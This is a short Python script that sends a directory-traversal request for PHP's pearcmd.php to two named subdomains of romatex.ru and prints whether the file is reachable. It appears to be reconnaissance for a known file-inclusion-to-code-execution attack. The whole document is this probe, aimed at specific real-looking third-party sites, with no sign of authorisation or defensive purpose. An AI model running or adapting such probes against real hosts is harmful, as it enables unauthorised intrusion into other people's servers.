from core import http
for h in ["chelyabinsk.romatex.ru", "ufa.romatex.ru"]:
    u = "/page-templates/../../../../../usr/local/lib/php/pearcmd.php"
    http.drop(h)
    try:
        r = http.request(h, u, tries=1)
    except Exception as e:
        print(h, "EXC", type(e).__name__); continue
    t = r.text or ""
    print("==", h, r.status_code, len(t), "pear:", "pearcmd" in t.lower())
    print(t[:300].replace("\n", " "))